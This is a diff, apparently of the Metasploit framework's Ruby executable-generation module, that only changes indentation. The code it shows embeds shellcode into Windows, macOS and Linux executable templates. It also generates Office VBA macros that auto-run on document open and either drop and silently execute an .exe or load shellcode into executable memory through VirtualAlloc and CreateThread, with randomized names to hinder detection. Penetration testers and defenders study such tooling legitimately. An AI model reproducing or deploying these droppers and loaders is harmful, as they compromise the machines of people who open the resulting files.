@@ -632,370 +632,370 @@ require 'digest/sha1'
       mo = fd.read(fd.stat.size)
     }
 
-		if (code.length <= 2048)
-			pe[bo, code.length] = [code].pack("a*")
-		else
-			raise RuntimeError, "The EXE generator now has a max size of 2048 bytes, please fix the calling module"
-		end
+    if (code.length <= 2048)
+      pe[bo, code.length] = [code].pack("a*")
+    else
+      raise RuntimeError, "The EXE generator now has a max size of 2048 bytes, please fix the calling module"
+    end
 
-		# optional mutex
-		mt = pe.index('MUTEX!!!')
-		pe[mt,8] = Rex::Text.rand_text_alpha(8) if mt
+    # optional mutex
+    mt = pe.index('MUTEX!!!')
+    pe[mt,8] = Rex::Text.rand_text_alpha(8) if mt
 
-		return pe
-	end
+    return pe
+  end
 
-	def self.to_osx_arm_macho(framework, code, opts={})
+  def self.to_osx_arm_macho(framework, code, opts={})
 
-		# Allow the user to specify their own template
-		set_template_default(opts, "template_armle_darwin.bin")
+    # Allow the user to specify their own template
+    set_template_default(opts, "template_armle_darwin.bin")
 
-		mo = ''
-		File.open(opts[:template], "rb") { |fd|
-			mo = fd.read(fd.stat.size)
-		}
+    mo = ''
+    File.open(opts[:template], "rb") { |fd|
+      mo = fd.read(fd.stat.size)
+    }
 
-		bo = mo.index('PAYLOAD:')
-		raise RuntimeError, "Invalid OSX ArmLE Mach-O template: missing \"PAYLOAD:\" tag" if not bo
-		mo[bo, code.length] = code
+    bo = mo.index('PAYLOAD:')
+    raise RuntimeError, "Invalid OSX ArmLE Mach-O template: missing \"PAYLOAD:\" tag" if not bo
+    mo[bo, code.length] = code
 
-		return mo
-	end
+    return mo
+  end
 
-	def self.to_osx_ppc_macho(framework, code, opts={})
+  def self.to_osx_ppc_macho(framework, code, opts={})
 
-		# Allow the user to specify their own template
-		set_template_default(opts, "template_ppc_darwin.bin")
+    # Allow the user to specify their own template
+    set_template_default(opts, "template_ppc_darwin.bin")
 
-		mo = ''
-		File.open(opts[:template], "rb") { |fd|
-			mo = fd.read(fd.stat.size)
-		}
+    mo = ''
+    File.open(opts[:template], "rb") { |fd|
+      mo = fd.read(fd.stat.size)
+    }
 
-		bo = mo.index('PAYLOAD:')
-		raise RuntimeError, "Invalid OSX PPC Mach-O template: missing \"PAYLOAD:\" tag" if not bo
-		mo[bo, code.length] = code
+    bo = mo.index('PAYLOAD:')
+    raise RuntimeError, "Invalid OSX PPC Mach-O template: missing \"PAYLOAD:\" tag" if not bo
+    mo[bo, code.length] = code
 
-		return mo
-	end
+    return mo
+  end
 
-	def self.to_osx_x86_macho(framework, code, opts={})
+  def self.to_osx_x86_macho(framework, code, opts={})
 
-		# Allow the user to specify their own template
-		set_template_default(opts, "template_x86_darwin.bin")
+    # Allow the user to specify their own template
+    set_template_default(opts, "template_x86_darwin.bin")
 
-		mo = ''
-		File.open(opts[:template], "rb") { |fd|
-			mo = fd.read(fd.stat.size)
-		}
+    mo = ''
+    File.open(opts[:template], "rb") { |fd|
+      mo = fd.read(fd.stat.size)
+    }
 
-		bo = mo.index('PAYLOAD:')
-		raise RuntimeError, "Invalid OSX x86 Mach-O template: missing \"PAYLOAD:\" tag" if not bo
-		mo[bo, code.length] = code
+    bo = mo.index('PAYLOAD:')
+    raise RuntimeError, "Invalid OSX x86 Mach-O template: missing \"PAYLOAD:\" tag" if not bo
+    mo[bo, code.length] = code
 
-		return mo
-	end
+    return mo
+  end
 
-	def self.to_osx_x64_macho(framework, code, opts={})
-		set_template_default(opts, "template_x64_darwin.bin")
+  def self.to_osx_x64_macho(framework, code, opts={})
+    set_template_default(opts, "template_x64_darwin.bin")
 
-		macho = ''
+    macho = ''
 
-		File.open(opts[:template], 'rb') { |fd|
-			macho = fd.read(fd.stat.size)
-		}
+    File.open(opts[:template], 'rb') { |fd|
+      macho = fd.read(fd.stat.size)
+    }
 
-		bin = macho.index('PAYLOAD:')
-		raise RuntimeError, "Invalid Mac OS X x86_64 Mach-O template: missing \"PAYLOAD:\" tag" if not bin
-		macho[bin, code.length] = code
+    bin = macho.index('PAYLOAD:')
+    raise RuntimeError, "Invalid Mac OS X x86_64 Mach-O template: missing \"PAYLOAD:\" tag" if not bin
+    macho[bin, code.length] = code
 
-		return macho
-	end
+    return macho
+  end
 
-	# Create an ELF executable containing the payload provided in +code+
-	#
-	# For the default template, this method just appends the payload, checks if
-	# the template is 32 or 64 bit and adjusts the offsets accordingly
-	# For user-provided templates, modifies the header to mark all executable
-	# segments as writable and overwrites the entrypoint (usually _start) with
-	# the payload.
-	#
-	def self.to_exe_elf(framework, opts, template, code, big_endian=false)
+  # Create an ELF executable containing the payload provided in +code+
+  #
+  # For the default template, this method just appends the payload, checks if
+  # the template is 32 or 64 bit and adjusts the offsets accordingly
+  # For user-provided templates, modifies the header to mark all executable
+  # segments as writable and overwrites the entrypoint (usually _start) with
+  # the payload.
+  #
+  def self.to_exe_elf(framework, opts, template, code, big_endian=false)
 
-		# Allow the user to specify their own template
-		set_template_default(opts, template)
+    # Allow the user to specify their own template
+    set_template_default(opts, template)
 
-		# The old way to do it is like other formats, just overwrite a big
-		# block of rwx mem with our shellcode.
-		#bo = elf.index( "\x90\x90\x90\x90" * 1024 )
-		#co = elf.index( " " * 512 )
-		#elf[bo, 2048] = [code].pack('a2048') if bo
+    # The old way to do it is like other formats, just overwrite a big
+    # block of rwx mem with our shellcode.
+    #bo = elf.index( "\x90\x90\x90\x90" * 1024 )
+    #co = elf.index( " " * 512 )
+    #elf[bo, 2048] = [code].pack('a2048') if bo
 
-		# The new template is just an ELF header with its entry point set to
-		# the end of the file, so just append shellcode to it and fixup
-		# p_filesz and p_memsz in the header for a working ELF executable.
-		elf = ''
-		File.open(opts[:template], "rb") { |fd|
-			elf = fd.read(fd.stat.size)
-		}
+    # The new template is just an ELF header with its entry point set to
+    # the end of the file, so just append shellcode to it and fixup
+    # p_filesz and p_memsz in the header for a working ELF executable.
+    elf = ''
+    File.open(opts[:template], "rb") { |fd|
+      elf = fd.read(fd.stat.size)
+    }
 
-		elf << code
+    elf << code
 
-		# Check EI_CLASS to determine if the header is 32 or 64 bit
-		# Use the proper offsets and pack size
-		case elf[4]
-		when 1, "\x01" # ELFCLASS32 - 32 bit (ruby 1.8 and 1.9)
-			if big_endian
-				elf[0x44,4] = [elf.length].pack('N') #p_filesz
-				elf[0x48,4] = [elf.length + code.length].pack('N') #p_memsz
-			else # little endian
-				elf[0x44,4] = [elf.length].pack('V') #p_filesz
-				elf[0x48,4] = [elf.length + code.length].pack('V') #p_memsz
-			end
-		when 2, "\x02" # ELFCLASS64 - 64 bit (ruby 1.8 and 1.9)
-			if big_endian
-				elf[0x60,8] = [elf.length].pack('Q>') #p_filesz
-				elf[0x68,8] = [elf.length + code.length].pack('Q>') #p_memsz
-			else # little endian
-				elf[0x60,8] = [elf.length].pack('Q') #p_filesz
-				elf[0x68,8] = [elf.length + code.length].pack('Q') #p_memsz
-			end
-		else
-			raise RuntimeError, "Invalid ELF template: EI_CLASS value not supported"
-		end
+    # Check EI_CLASS to determine if the header is 32 or 64 bit
+    # Use the proper offsets and pack size
+    case elf[4]
+    when 1, "\x01" # ELFCLASS32 - 32 bit (ruby 1.8 and 1.9)
+      if big_endian
+        elf[0x44,4] = [elf.length].pack('N') #p_filesz
+        elf[0x48,4] = [elf.length + code.length].pack('N') #p_memsz
+      else # little endian
+        elf[0x44,4] = [elf.length].pack('V') #p_filesz
+        elf[0x48,4] = [elf.length + code.length].pack('V') #p_memsz
+      end
+    when 2, "\x02" # ELFCLASS64 - 64 bit (ruby 1.8 and 1.9)
+      if big_endian
+        elf[0x60,8] = [elf.length].pack('Q>') #p_filesz
+        elf[0x68,8] = [elf.length + code.length].pack('Q>') #p_memsz
+      else # little endian
+        elf[0x60,8] = [elf.length].pack('Q') #p_filesz
+        elf[0x68,8] = [elf.length + code.length].pack('Q') #p_memsz
+      end
+    else
+      raise RuntimeError, "Invalid ELF template: EI_CLASS value not supported"
+    end
 
-		return elf
-	end
+    return elf
+  end
 
-	# Create a 32-bit Linux ELF containing the payload provided in +code+
-	def self.to_linux_x86_elf(framework, code, opts={})
-		unless opts[:template]
-			default = true
-		end
+  # Create a 32-bit Linux ELF containing the payload provided in +code+
+  def self.to_linux_x86_elf(framework, code, opts={})
+    unless opts[:template]
+      default = true
+    end
 
-		if default
-			elf = to_exe_elf(framework, opts, "template_x86_linux.bin", code)
-		else
-			# If this isn't our normal template, we have to do some fancy
-			# header patching to mark the .text section rwx before putting our
-			# payload into the entry point.
+    if default
+      elf = to_exe_elf(framework, opts, "template_x86_linux.bin", code)
+    else
+      # If this isn't our normal template, we have to do some fancy
+      # header patching to mark the .text section rwx before putting our
+      # payload into the entry point.
 
-			# read in the template and parse it
-			e = Metasm::ELF.decode_file(opts[:template])
+      # read in the template and parse it
+      e = Metasm::ELF.decode_file(opts[:template])
 
-			# This will become a modified copy of the template's original phdr
-			new_phdr = Metasm::EncodedData.new
-			e.segments.each { |s|
-				# Be lazy and mark any executable segment as writable.  Doing
-				# it this way means we don't have to care about which one
-				# contains .text
-				if s.flags.include? "X"
-					s.flags += [ "W" ]
-				end
-				new_phdr << s.encode(e)
-			}
+      # This will become a modified copy of the template's original phdr
+      new_phdr = Metasm::EncodedData.new
+      e.segments.each { |s|
+        # Be lazy and mark any executable segment as writable.  Doing
+        # it this way means we don't have to care about which one
+        # contains .text
+        if s.flags.include? "X"
+          s.flags += [ "W" ]
+        end
+        new_phdr << s.encode(e)
+      }
 
-			# Copy the original file
-			elf = File.open(opts[:template], "rb") {|fd| fd.read(fd.stat.size) }
+      # Copy the original file
+      elf = File.open(opts[:template], "rb") {|fd| fd.read(fd.stat.size) }
 
-			# Replace the header with our rwx modified version
-			elf[e.header.phoff, new_phdr.data.length] = new_phdr.data
+      # Replace the header with our rwx modified version
+      elf[e.header.phoff, new_phdr.data.length] = new_phdr.data
 
-			# Replace code at the entrypoint with our payload
-			entry_off = e.addr_to_off(e.label_addr('entrypoint'))
-			elf[entry_off, code.length] = code
-		end
+      # Replace code at the entrypoint with our payload
+      entry_off = e.addr_to_off(e.label_addr('entrypoint'))
+      elf[entry_off, code.length] = code
+    end
 
-		return elf
-	end
+    return elf
+  end
 
-	# Create a 32-bit BSD (test on FreeBSD) ELF containing the payload provided in +code+
-	def self.to_bsd_x86_elf(framework, code, opts={})
-		elf = to_exe_elf(framework, opts, "template_x86_bsd.bin", code)
-		return elf
-	end
+  # Create a 32-bit BSD (test on FreeBSD) ELF containing the payload provided in +code+
+  def self.to_bsd_x86_elf(framework, code, opts={})
+    elf = to_exe_elf(framework, opts, "template_x86_bsd.bin", code)
+    return elf
+  end
 
-	# Create a 32-bit Solaris ELF containing the payload provided in +code+
-	def self.to_solaris_x86_elf(framework, code, opts={})
-		elf = to_exe_elf(framework, opts, "template_x86_solaris.bin", code)
-		return elf
-	end
+  # Create a 32-bit Solaris ELF containing the payload provided in +code+
+  def self.to_solaris_x86_elf(framework, code, opts={})
+    elf = to_exe_elf(framework, opts, "template_x86_solaris.bin", code)
+    return elf
+  end
 
-	# Create a 64-bit Linux ELF containing the payload provided in +code+
-	def self.to_linux_x64_elf(framework, code, opts={})
-		elf = to_exe_elf(framework, opts, "template_x64_linux.bin", code)
-		return elf
-	end
+  # Create a 64-bit Linux ELF containing the payload provided in +code+
+  def self.to_linux_x64_elf(framework, code, opts={})
+    elf = to_exe_elf(framework, opts, "template_x64_linux.bin", code)
+    return elf
+  end
 
-	def self.to_linux_armle_elf(framework, code, opts={})
-		elf = to_exe_elf(framework, opts, "template_armle_linux.bin", code)
-		return elf
-	end
+  def self.to_linux_armle_elf(framework, code, opts={})
+    elf = to_exe_elf(framework, opts, "template_armle_linux.bin", code)
+    return elf
+  end
 
-	def self.to_linux_mipsle_elf(framework, code, opts={})
-		elf = to_exe_elf(framework, opts, "template_mipsle_linux.bin", code)
-		return elf
-	end
+  def self.to_linux_mipsle_elf(framework, code, opts={})
+    elf = to_exe_elf(framework, opts, "template_mipsle_linux.bin", code)
+    return elf
+  end
 
-	def self.to_linux_mipsbe_elf(framework, code, opts={})
-		elf = to_exe_elf(framework, opts, "template_mipsbe_linux.bin", code, true)
-		return elf
-	end
+  def self.to_linux_mipsbe_elf(framework, code, opts={})
+    elf = to_exe_elf(framework, opts, "template_mipsbe_linux.bin", code, true)
+    return elf
+  end
 
-	def self.to_exe_vba(exes='')
-		exe = exes.unpack('C*')
-		vba = ""
-		idx = 0
-		maxbytes = 2000
+  def self.to_exe_vba(exes='')
+    exe = exes.unpack('C*')
+    vba = ""
+    idx = 0
+    maxbytes = 2000
 
-		var_magic    = Rex::Text.rand_text_alpha(10).capitalize
-		var_base     = Rex::Text.rand_text_alpha(5).capitalize
-		var_base_idx = 0
+    var_magic    = Rex::Text.rand_text_alpha(10).capitalize
+    var_base     = Rex::Text.rand_text_alpha(5).capitalize
+    var_base_idx = 0
 
-		# First write the macro into the vba file
-		var_fname = var_base + (var_base_idx+=1).to_s
-		var_fenvi = var_base + (var_base_idx+=1).to_s
-		var_fhand = var_base + (var_base_idx+=1).to_s
-		var_parag = var_base + (var_base_idx+=1).to_s
-		var_itemp = var_base + (var_base_idx+=1).to_s
-		var_btemp = var_base + (var_base_idx+=1).to_s
-		var_appnr = var_base + (var_base_idx+=1).to_s
-		var_index = var_base + (var_base_idx+=1).to_s
-		var_gotmagic = var_base + (var_base_idx+=1).to_s
-		var_farg = var_base + (var_base_idx+=1).to_s
-		var_stemp = var_base + (var_base_idx+=1).to_s
+    # First write the macro into the vba file
+    var_fname = var_base + (var_base_idx+=1).to_s
+    var_fenvi = var_base + (var_base_idx+=1).to_s
+    var_fhand = var_base + (var_base_idx+=1).to_s
+    var_parag = var_base + (var_base_idx+=1).to_s
+    var_itemp = var_base + (var_base_idx+=1).to_s
+    var_btemp = var_base + (var_base_idx+=1).to_s
+    var_appnr = var_base + (var_base_idx+=1).to_s
+    var_index = var_base + (var_base_idx+=1).to_s
+    var_gotmagic = var_base + (var_base_idx+=1).to_s
+    var_farg = var_base + (var_base_idx+=1).to_s
+    var_stemp = var_base + (var_base_idx+=1).to_s
 
-		# Function 1 extracts the binary
-		func_name1 = var_base + (var_base_idx+=1).to_s
+    # Function 1 extracts the binary
+    func_name1 = var_base + (var_base_idx+=1).to_s
 
-		# Function 2 executes the binary
-		func_name2 = var_base + (var_base_idx+=1).to_s
+    # Function 2 executes the binary
+    func_name2 = var_base + (var_base_idx+=1).to_s
 
-		vba << "'**************************************************************\r\n"
-		vba << "'*\r\n"
-		vba << "'* This code is now split into two pieces:\r\n"
-		vba << "'*  1. The Macro. This must be copied into the Office document\r\n"
-		vba << "'*     macro editor. This macro will run on startup.\r\n"
-		vba << "'*\r\n"
-		vba << "'*  2. The Data. The hex dump at the end of this output must be\r\n"
-		vba << "'*     appended to the end of the document contents.\r\n"
-		vba << "'*\r\n"
-		vba << "'**************************************************************\r\n"
-		vba << "'*\r\n"
-		vba << "'* MACRO CODE\r\n"
-		vba << "'*\r\n"
-		vba << "'**************************************************************\r\n"
+    vba << "'**************************************************************\r\n"
+    vba << "'*\r\n"
+    vba << "'* This code is now split into two pieces:\r\n"
+    vba << "'*  1. The Macro. This must be copied into the Office document\r\n"
+    vba << "'*     macro editor. This macro will run on startup.\r\n"
+    vba << "'*\r\n"
+    vba << "'*  2. The Data. The hex dump at the end of this output must be\r\n"
+    vba << "'*     appended to the end of the document contents.\r\n"
+    vba << "'*\r\n"
+    vba << "'**************************************************************\r\n"
+    vba << "'*\r\n"
+    vba << "'* MACRO CODE\r\n"
+    vba << "'*\r\n"
+    vba << "'**************************************************************\r\n"
 
-		# The wrapper makes it easier to integrate it into other macros
-		vba << "Sub Auto_Open()\r\n"
-		vba << "\t#{func_name1}\r\n"
-		vba << "End Sub\r\n"
+    # The wrapper makes it easier to integrate it into other macros
+    vba << "Sub Auto_Open()\r\n"
+    vba << "\t#{func_name1}\r\n"
+    vba << "End Sub\r\n"
 
-		vba << "Sub #{func_name1}()\r\n"
-		vba << "\tDim #{var_appnr} As Integer\r\n"
-		vba << "\tDim #{var_fname} As String\r\n"
-		vba << "\tDim #{var_fenvi} As String\r\n"
-		vba << "\tDim #{var_fhand} As Integer\r\n"
-		vba << "\tDim #{var_parag} As Paragraph\r\n"
-		vba << "\tDim #{var_index} As Integer\r\n"
-		vba << "\tDim #{var_gotmagic} As Boolean\r\n"
-		vba << "\tDim #{var_itemp} As Integer\r\n"
-		vba << "\tDim #{var_stemp} As String\r\n"
-		vba << "\tDim #{var_btemp} As Byte\r\n"
-		vba << "\tDim #{var_magic} as String\r\n"
-		vba << "\t#{var_magic} = \"#{var_magic}\"\r\n"
-		vba << "\t#{var_fname} = \"#{Rex::Text.rand_text_alpha(rand(8)+8)}.exe\"\r\n"
-		vba << "\t#{var_fenvi} = Environ(\"USERPROFILE\")\r\n"
-		vba << "\tChDrive (#{var_fenvi})\r\n"
-		vba << "\tChDir (#{var_fenvi})\r\n"
-		vba << "\t#{var_fhand} = FreeFile()\r\n"
-		vba << "\tOpen #{var_fname} For Binary As #{var_fhand}\r\n"
-		vba << "\tFor Each #{var_parag} in ActiveDocument.Paragraphs\r\n"
-		vba << "\t\tDoEvents\r\n"
-		vba << "\t\t\t#{var_stemp} = #{var_parag}.Range.Text\r\n"
-		vba << "\t\tIf (#{var_gotmagic} = True) Then\r\n"
-		vba << "\t\t\t#{var_index} = 1\r\n"
-		vba << "\t\t\tWhile (#{var_index} < Len(#{var_stemp}))\r\n"
-		vba << "\t\t\t\t#{var_btemp} = Mid(#{var_stemp},#{var_index},4)\r\n"
-		vba << "\t\t\t\tPut ##{var_fhand}, , #{var_btemp}\r\n"
-		vba << "\t\t\t\t#{var_index} = #{var_index} + 4\r\n"
-		vba << "\t\t\tWend\r\n"
-		vba << "\t\tElseIf (InStr(1,#{var_stemp},#{var_magic}) > 0 And Len(#{var_stemp}) > 0) Then\r\n"
-		vba << "\t\t\t#{var_gotmagic} = True\r\n"
-		vba << "\t\tEnd If\r\n"
-		vba << "\tNext\r\n"
-		vba << "\tClose ##{var_fhand}\r\n"
-		vba << "\t#{func_name2}(#{var_fname})\r\n"
-		vba << "End Sub\r\n"
+    vba << "Sub #{func_name1}()\r\n"
+    vba << "\tDim #{var_appnr} As Integer\r\n"
+    vba << "\tDim #{var_fname} As String\r\n"
+    vba << "\tDim #{var_fenvi} As String\r\n"
+    vba << "\tDim #{var_fhand} As Integer\r\n"
+    vba << "\tDim #{var_parag} As Paragraph\r\n"
+    vba << "\tDim #{var_index} As Integer\r\n"
+    vba << "\tDim #{var_gotmagic} As Boolean\r\n"
+    vba << "\tDim #{var_itemp} As Integer\r\n"
+    vba << "\tDim #{var_stemp} As String\r\n"
+    vba << "\tDim #{var_btemp} As Byte\r\n"
+    vba << "\tDim #{var_magic} as String\r\n"
+    vba << "\t#{var_magic} = \"#{var_magic}\"\r\n"
+    vba << "\t#{var_fname} = \"#{Rex::Text.rand_text_alpha(rand(8)+8)}.exe\"\r\n"
+    vba << "\t#{var_fenvi} = Environ(\"USERPROFILE\")\r\n"
+    vba << "\tChDrive (#{var_fenvi})\r\n"
+    vba << "\tChDir (#{var_fenvi})\r\n"
+    vba << "\t#{var_fhand} = FreeFile()\r\n"
+    vba << "\tOpen #{var_fname} For Binary As #{var_fhand}\r\n"
+    vba << "\tFor Each #{var_parag} in ActiveDocument.Paragraphs\r\n"
+    vba << "\t\tDoEvents\r\n"
+    vba << "\t\t\t#{var_stemp} = #{var_parag}.Range.Text\r\n"
+    vba << "\t\tIf (#{var_gotmagic} = True) Then\r\n"
+    vba << "\t\t\t#{var_index} = 1\r\n"
+    vba << "\t\t\tWhile (#{var_index} < Len(#{var_stemp}))\r\n"
+    vba << "\t\t\t\t#{var_btemp} = Mid(#{var_stemp},#{var_index},4)\r\n"
+    vba << "\t\t\t\tPut ##{var_fhand}, , #{var_btemp}\r\n"
+    vba << "\t\t\t\t#{var_index} = #{var_index} + 4\r\n"
+    vba << "\t\t\tWend\r\n"
+    vba << "\t\tElseIf (InStr(1,#{var_stemp},#{var_magic}) > 0 And Len(#{var_stemp}) > 0) Then\r\n"
+    vba << "\t\t\t#{var_gotmagic} = True\r\n"
+    vba << "\t\tEnd If\r\n"
+    vba << "\tNext\r\n"
+    vba << "\tClose ##{var_fhand}\r\n"
+    vba << "\t#{func_name2}(#{var_fname})\r\n"
+    vba << "End Sub\r\n"
 
-		vba << "Sub #{func_name2}(#{var_farg} As String)\r\n"
-		vba << "\tDim #{var_appnr} As Integer\r\n"
-		vba << "\tDim #{var_fenvi} As String\r\n"
-		vba << "\t#{var_fenvi} = Environ(\"USERPROFILE\")\r\n"
-		vba << "\tChDrive (#{var_fenvi})\r\n"
-		vba << "\tChDir (#{var_fenvi})\r\n"
-		vba << "\t#{var_appnr} = Shell(#{var_farg}, vbHide)\r\n"
-		vba << "End Sub\r\n"
+    vba << "Sub #{func_name2}(#{var_farg} As String)\r\n"
+    vba << "\tDim #{var_appnr} As Integer\r\n"
+    vba << "\tDim #{var_fenvi} As String\r\n"
+    vba << "\t#{var_fenvi} = Environ(\"USERPROFILE\")\r\n"
+    vba << "\tChDrive (#{var_fenvi})\r\n"
+    vba << "\tChDir (#{var_fenvi})\r\n"
+    vba << "\t#{var_appnr} = Shell(#{var_farg}, vbHide)\r\n"
+    vba << "End Sub\r\n"
 
-		vba << "Sub AutoOpen()\r\n"
-		vba << "\tAuto_Open\r\n"
-		vba << "End Sub\r\n"
+    vba << "Sub AutoOpen()\r\n"
+    vba << "\tAuto_Open\r\n"
+    vba << "End Sub\r\n"
 
-		vba << "Sub Workbook_Open()\r\n"
-		vba << "\tAuto_Open\r\n"
-		vba << "End Sub\r\n"
-		vba << "'**************************************************************\r\n"
-		vba << "'*\r\n"
-		vba << "'* PAYLOAD DATA\r\n"
-		vba << "'*\r\n"
-		vba << "'**************************************************************\r\n\r\n\r\n"
-		vba << "#{var_magic}\r\n"
+    vba << "Sub Workbook_Open()\r\n"
+    vba << "\tAuto_Open\r\n"
+    vba << "End Sub\r\n"
+    vba << "'**************************************************************\r\n"
+    vba << "'*\r\n"
+    vba << "'* PAYLOAD DATA\r\n"
+    vba << "'*\r\n"
+    vba << "'**************************************************************\r\n\r\n\r\n"
+    vba << "#{var_magic}\r\n"
 
-		# Writing the bytes of the exe to the file
-		1.upto(exe.length) do |pc|
-			while(c = exe[idx])
-				vba << "&H#{("%.2x" % c).upcase}"
-				if (idx > 1 and (idx % maxbytes) == 0)
-					# When maxbytes are written make a new paragrpah
-					vba << "\r\n"
-				end
-				idx += 1
-			end
-		end
-		return vba
-	end
+    # Writing the bytes of the exe to the file
+    1.upto(exe.length) do |pc|
+      while(c = exe[idx])
+        vba << "&H#{("%.2x" % c).upcase}"
+        if (idx > 1 and (idx % maxbytes) == 0)
+          # When maxbytes are written make a new paragrpah
+          vba << "\r\n"
+        end
+        idx += 1
+      end
+    end
+    return vba
+  end
 
-	def self.to_vba(framework,code,opts={})
-		var_myByte    = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_myArray   = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_rwxpage   = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_res       = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_offset    = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_lpThreadAttributes = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_dwStackSize        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_lpStartAddress     = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_lpParameter        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_dwCreationFlags  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_lpThreadID       = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_lpAddr           = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_lSize            = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_flAllocationType = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_flProtect        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_lDest        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_Source       = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-		var_Length       = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+  def self.to_vba(framework,code,opts={})
+    var_myByte    = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_myArray   = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_rwxpage   = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_res       = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_offset    = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_lpThreadAttributes = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_dwStackSize        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_lpStartAddress     = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_lpParameter        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_dwCreationFlags  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_lpThreadID       = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_lpAddr           = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_lSize            = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_flAllocationType = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_flProtect        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_lDest        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_Source       = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    var_Length       = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
 
-		# put the shellcode bytes into an array
-		bytes = ''
-		maxbytes = 20
-		codebytes = code.unpack('C*')
-		1.upto(codebytes.length) do |idx|
-			bytes << codebytes[idx].to_s
-			bytes << "," if idx < codebytes.length - 1
-			bytes << " _\r\n" if (idx > 1 and (idx % maxbytes) == 0)
-		end
+    # put the shellcode bytes into an array
+    bytes = ''
+    maxbytes = 20
+    codebytes = code.unpack('C*')
+    1.upto(codebytes.length) do |idx|
+      bytes << codebytes[idx].to_s
+      bytes << "," if idx < codebytes.length - 1
+      bytes << " _\r\n" if (idx > 1 and (idx % maxbytes) == 0)
+    end
 
-		"#If Vba7 Then
+    "#If Vba7 Then
 Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal #{var_lpThreadAttributes} As Long, ByVal #{var_dwStackSize} As Long, ByVal #{var_lpStartAddress} As LongPtr, #{var_lpParameter} As Long, ByVal #{var_dwCreationFlags} As Long, #{var_lpThreadID} As Long) As LongPtr
 Private Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal #{var_lpAddr} As Long, ByVal #{var_lSize} As Long, ByVal #{var_flAllocationType} As Long, ByVal #{var_flProtect} As Long) As LongPtr
 Private Declare PtrSafe Function RtlMoveMemory Lib \"kernel32\" (ByVal #{var_lDest} As LongPtr, ByRef #{var_Source} As Any, ByVal #{var_Length} As Long) As LongPtr
@@ -1006,207 +1006,207 @@ Private Declare Function RtlMoveMemory Lib \"kernel32\" (ByVal #{var_lDest} As L
 #EndIf
 
 Sub Auto_Open()
-	Dim #{var_myByte} As Long, #{var_myArray} As Variant, #{var_offset} As Long
+  Dim #{var_myByte} As Long, #{var_myArray} As Variant, #{var_offset} As Long
 #If Vba7 Then
-	Dim  #{var_rwxpage} As LongPtr, #{var_res} As LongPtr
+  Dim  #{var_rwxpage} As LongPtr, #{var_res} As LongPtr
 #Else
-	Dim  #{var_rwxpage} As Long, #{var_res} As Long
+  Dim  #{var_rwxpage} As Long, #{var_res} As Long
 #EndIf
-	#{var_myArray} = Array(#{bytes})
-	#{var_rwxpage} = VirtualAlloc(0, UBound(#{var_myArray}), &H1000, &H40)
-	For #{var_offset} = LBound(#{var_myArray}) To UBound(#{var_myArray})
-		#{var_myByte} = #{var_myArray}(#{var_offset})
-		#{var_res} = RtlMoveMemory(#{var_rwxpage} + #{var_offset}, #{var_myByte}, 1)
-	Next #{var_offset}
-	#{var_res} = CreateThread(0, 0, #{var_rwxpage}, 0, 0, 0)
+  #{var_myArray} = Array(#{bytes})
+  #{var_rwxpage} = VirtualAlloc(0, UBound(#{var_myArray}), &H1000, &H40)
+  For #{var_offset} = LBound(#{var_myArray}) To UBound(#{var_myArray})
+    #{var_myByte} = #{var_myArray}(#{var_offset})
+    #{var_res} = RtlMoveMemory(#{var_rwxpage} + #{var_offset}, #{var_myByte}, 1)
+  Next #{var_offset}
+  #{var_res} = CreateThread(0, 0, #{var_rwxpage}, 0, 0, 0)
 End Sub
 Sub AutoOpen()
-	Auto_Open
+  Auto_Open
 End Sub
 Sub Workbook_Open()
-	Auto_Open
+  Auto_Open
 End Sub
 "
-	end
+  end
 
-	def self.to_win32pe_vba(framework, code, opts={})
-		to_exe_vba(to_win32pe(framework, code, opts))
-	end
+  def self.to_win32pe_vba(framework, code, opts={})
+    to_exe_vba(to_win32pe(framework, code, opts))
+  end
 
-	def self.to_exe_vbs(exes = '', opts={})
-		delay   = opts[:delay]   || 5
-		persist = opts[:persist] || false
+  def self.to_exe_vbs(exes = '', opts={})
+    delay   = opts[:delay]   || 5
+    persist = opts[:persist] || false
 
-		exe = exes.unpack('C*')
-		vbs = ""
+    exe = exes.unpack('C*')
+    vbs = ""
 
-		var_bytes   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
-		var_fname   = Rex::Text.rand_text_alpha(rand(8)+8)
-		var_func    = Rex::Text.rand_text_alpha(rand(8)+8)
